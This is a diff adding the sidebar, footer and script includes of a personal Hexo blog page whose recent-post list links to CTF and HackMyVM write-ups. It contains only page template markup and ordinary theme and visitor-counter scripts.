+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
